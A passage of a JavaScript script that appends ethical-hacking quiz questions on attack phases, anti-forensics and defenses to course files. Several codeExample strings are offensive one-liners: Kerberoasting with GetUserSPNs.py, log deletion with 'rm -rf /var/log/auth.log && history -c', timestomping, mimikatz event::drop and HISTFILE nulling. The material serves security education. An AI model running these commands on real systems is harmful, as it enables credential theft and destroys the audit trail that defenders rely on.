      explanation: "Because service tickets are encrypted with the target service account's password hash, offline cracking (hashcat) requires zero interaction with the domain controller once dumped.",
      hint: "Requesting Kerberos TGS tickets for SPNs and cracking them offline.",
      level: "advanced",
      codeExample: "GetUserSPNs.py -request -dc-ip 10.0.0.1 corp.local/user:password -outputfile hashes.kerberoast"
    },
    {
      question: "What defensive measure mitigates Lateral Movement across enterprise endpoints?",
      shortAnswer: "Internal network micro-segmentation, host-based firewalls blocking peer-to-peer SMB/RDP, LAPS (Local Administrator Password Solution), and Zero Trust network access.",
      explanation: "LAPS ensures that every local workstation has a unique, randomized administrator password, preventing a single compromised local admin credential from unlocking the entire enterprise.",
      hint: "LAPS randomizing local admin passwords and blocking peer-to-peer workstation traffic.",
      level: "moderate",
      codeExample: "// LAPS automatically manages and rotates local Administrator passwords via Active Directory"
    }
  ],

  '002_003_phases-of-hacking/topic9_files/topic9_questions.js': [
    {
      question: "What is the primary objective of Phase 5: Covering Tracks in the hacking lifecycle?",
      shortAnswer: "To erase evidence of the intrusion, tamper with audit logs, delete temporary staging files, and remove forensic artifacts to prolong attacker persistence and evade law enforcement.",
      explanation: "Covering tracks hinders incident responders from reconstructing attack timelines, scoping compromised data, or attributing the intrusion to specific threat actors.",
      hint: "Deleting logs, removing staging files, and preventing incident reconstruction.",
      level: "basic",
      codeExample: "rm -rf /var/log/auth.log && history -c"
    },
    {
      question: "What is Timestomping and how does it confound digital forensic timelines?",
      shortAnswer: "A technique that modifies the file timestamp metadata (MACB: Modified, Accessed, Created, Born) to match surrounding legitimate system files, concealing recent malware installation.",
      explanation: "Incident responders sort files chronologically to find recently dropped binaries. Timestomping changes the file creation date to years prior, disguising it as an original OS binary.",
      hint: "Altering file creation and modification dates to match legitimate system files.",
      level: "moderate",
      codeExample: "timestomp target_file.exe -m '01/15/2018 10:20:00 AM' # Meterpreter timestomp"
    },
    {
      question: "How do attackers manipulate Windows Event Logs without crashing the EventLog service?",
      shortAnswer: "By selectively clearing specific event records (via direct API memory manipulation or tools like Mimikatz `event::drop`) rather than wiping the entire log file.",
      explanation: "Completely clearing event logs generates Event ID 1102 ('The audit log was cleared'), which triggers high-priority alerts in modern SIEM systems.",
      hint: "Selectively deleting intrusion events rather than clearing the entire log.",
      level: "advanced",
      codeExample: "mimikatz \"event::drop\" # Disables event log service thread from recording further events"
    },
    {
      question: "What is 'Log Tampering' in Linux environments and how is bash history concealed?",
      shortAnswer: "Manipulating `/var/log` files (syslog, auth.log, wtmp) and disabling command line logging by unsetting the `HISTFILE` environment variable or executing commands with a leading space.",
      explanation: "Setting `export HISTSIZE=0` or executing `kill -9 $$` terminates the shell without writing cached command lines to `~/.bash_history`.",
      hint: "Disabling HISTFILE or unsetting history so executed shell commands are not saved.",
      level: "moderate",
      codeExample: "export HISTFILE=/dev/null # Redirects shell history to null device"
    },
    {
      question: "What defensive architectural measure prevents attackers from successfully covering tracks on local endpoints?",
      shortAnswer: "Centralized, real-time log forwarding to a write-only, tamper-resistant SIEM/Syslog server or immutable WORM (Write Once, Read Many) cloud storage.",
      explanation: "Even if an attacker wipes local logs with root/SYSTEM privileges, logs already transmitted to a remote SIEM cannot be deleted from the compromised endpoint.",
      hint: "Real-time forwarding of logs to an isolated, immutable remote SIEM server.",
      level: "moderate",
      codeExample: "*.* @@log-collector.corp.internal:514 # Rsyslog forwarding all events immediately over TLS"
    }
  ],

  '002_003_phases-of-hacking/topic10_files/topic10_questions.js': [
    {
      question: "What is the Lockheed Martin Cyber Kill Chain and what are its 7 stages?",
      shortAnswer: "A military-derived model for identifying cyber attacks: 1. Reconnaissance, 2. Weaponization, 3. Delivery, 4. Exploitation, 5. Installation, 6. Command & Control (C2), 7. Actions on Objectives.",
      explanation: "The core defensive philosophy is that disrupting any single stage breaks the entire attack chain, protecting enterprise assets.",
      hint: "Recon, Weaponization, Delivery, Exploitation, Installation, C2, Actions on Objectives.",
      level: "basic",
      codeExample: "CyberKillChain = ['Recon', 'Weaponize', 'Deliver', 'Exploit', 'Install', 'C2', 'Actions'];"
    },
    {
      question: "How does the MITRE ATT&CK framework differ from the Cyber Kill Chain?",
      shortAnswer: "The Cyber Kill Chain is a high-level sequential linear progression; MITRE ATT&CK is an exhaustive, non-linear matrix of real-world adversary Tactics, Techniques, and Procedures (TTPs).",
      explanation: "MITRE ATT&CK catalogs hundreds of granular techniques (e.g. T1059 Command and Scripting Interpreter) and sub-techniques, mapping real-world APT behavioral patterns.",
      hint: "Linear high-level model vs granular non-linear matrix of real-world tactics & techniques.",
      level: "moderate",
      codeExample: "MITRE_Technique = { ID: 'T1059.001', Name: 'PowerShell Execution', Tactic: 'Execution' };"
    },
    {
      question: "What does 'Actions on Objectives' mean in the Cyber Kill Chain?",
      shortAnswer: "The ultimate goal of the adversary once access is secured: data exfiltration, ransomware encryption, financial theft, or operational disruption.",
      explanation: "Everything preceding this stage represents preparation; Actions on Objectives is where the victim experiences tangible financial or operational damage.",
      hint: "The final attack phase where data is stolen, encrypted, or destroyed.",
      level: "basic",
      codeExample: "ActionsOnObjectives: 'Encrypt DB with AES-256 and transmit ransom note to printers'"
    },
    {
      question: "What is the Diamond Model of Intrusion Analysis?",
      shortAnswer: "A threat analysis framework linking four core facets of every cyber incident: Adversary, Capability, Infrastructure, and Victim.",
      explanation: "The Diamond Model tracks how adversaries use specific technical capabilities over external infrastructure to compromise designated victims.",
      hint: "Four-node model analyzing Adversary, Capability, Infrastructure, and Victim.",
      level: "moderate",
      codeExample: "DiamondModel = { Adversary: 'APT29', Capability: 'CobaltStrike', Infra: 'Tor Nodes', Victim: 'Gov Agency' };"
    },
    {
      question: "How do defensive security operations centers (SOCs) use MITRE ATT&CK matrices?",
      shortAnswer: "To map existing SIEM/EDR detection rules across the matrix, identifying defensive coverage gaps and prioritizing new detection engineering rules.",
      explanation: "SOC analysts visualize techniques in green (detected) and red (undetected), ensuring balanced defenses across all attack stages.",
      hint: "Mapping detection coverage across attack techniques to spot blind spots.",
      level: "moderate",
      codeExample: "HeatmapCoverage: { 'T1059': 'Covered', 'T1003': 'Covered', 'T1055': 'BlindSpot' }"
    }
  ],

  '002_003_phases-of-hacking/topic11_files/topic11_questions.js': [
    {
      question: "What defensive countermeasures disrupt the Reconnaissance phase?",
      shortAnswer: "Restricting public WHOIS privacy records, disabling DNS zone transfers, sanitizing public job postings, and monitoring threat intelligence and paste sites for brand leaks.",
      explanation: "Minimizing the public digital footprint starves adversaries of easy target profiling.",
      hint: "WHOIS privacy, disabling DNS AXFR, and removing sensitive technical job specs.",
      level: "basic",
      codeExample: "options { allow-transfer { none; }; }; # Named.conf disabling DNS zone transfers"
    },
    {
      question: "What defensive countermeasures disrupt Phase 2: Scanning and Enumeration?",
      shortAnswer: "Port-knocking, rate-limiting ICMP/TCP connections, closing unnecessary ports, and deploying Intrusion Prevention Systems (IPS) that auto-ban scanning IPs.",
      explanation: "IPS tools (like fail2ban or Snort) identify SYN flood patterns and dynamically inject firewall drop rules.",
      hint: "Intrusion prevention systems, firewalls, and automated scanning IP blocking.",
      level: "moderate",
      codeExample: "iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --set --name SSH"
    },
    {
      question: "What defensive countermeasures neutralize Phase 3: Gaining Access?",
      shortAnswer: "Multi-Factor Authentication (MFA), timely security patch management, input validation (WAF), email sandboxing, and disabling macro execution.",
      explanation: "MFA blocks >99% of automated credential stuffing attacks; automated patching eliminates known N-day vulnerability windows.",
      hint: "Enforcing MFA on all logins, automated patching, and WAF input validation.",
      level: "basic",
      codeExample: "WAF_Rule: 'SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_FILENAME \"@rx select.+from\" ...'"
    },
    {
      question: "What defensive countermeasures break Phase 4: Maintaining Access?",
      shortAnswer: "EDR process monitoring, application whitelisting (AppLocker), restricting scheduled task creation, and auditing startup registry run keys.",
      explanation: "Preventing unauthorized binaries from registering autostart keys blocks backdoors from surviving reboots.",
      hint: "Application whitelisting and auditing auto-start extensibility points.",
      level: "moderate",
      codeExample: "Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run # Audit startup keys"
    },
    {
      question: "What defensive countermeasures counter Phase 5: Covering Tracks?",
      shortAnswer: "Write-once central logging (WORM storage), SIEM log forwarding over TLS, file integrity monitoring (FIM like Tripwire), and strict user privileges.",
      explanation: "File integrity monitors immediately alert if system binaries or audit logs are modified or deleted.",
      hint: "File Integrity Monitoring (FIM) and remote append-only log collectors.",
      level: "moderate",
      codeExample: "auditctl -w /var/log/auth.log -p wa -k auth_log_tamper # Auditd rule detecting tampering"
    },
    {
      question: "What is the 'Defense-in-Depth' security principle across the 5 phases?",
      shortAnswer: "Implementing multiple layered, overlapping defensive controls (perimeter, network, endpoint, application, and data) so that failure of one control does not result in compromise.",
      explanation: "If perimeter firewalls fail during scanning, endpoint EDR blocks exploitation; if exploitation succeeds, network segmentation blocks lateral movement.",
      hint: "Layered defensive security ensuring no single point of failure.",
      level: "basic",
      codeExample: "Layers = ['Perimeter Firewall', 'Network Segmentation', 'EDR', 'Access Control', 'Data Encryption'];"
    }
  ]
};

// -----------------------------------------------------------------------------
// EXECUTE UPDATES
// -----------------------------------------------------------------------------

console.log('=== EXPANDING MODULE 002_002 (Hacking & Ethical Hacking) ===');
Object.keys(mod2_002).forEach(relPath => {
  appendQuestions(relPath, mod2_002[relPath]);
});

console.log('\n=== EXPANDING MODULE 002_003 (Phases of Hacking) ===');
Object.keys(mod2_003).forEach(relPath => {
  appendQuestions(relPath, mod2_003[relPath]);
});

console.log('\nBatch complete.');
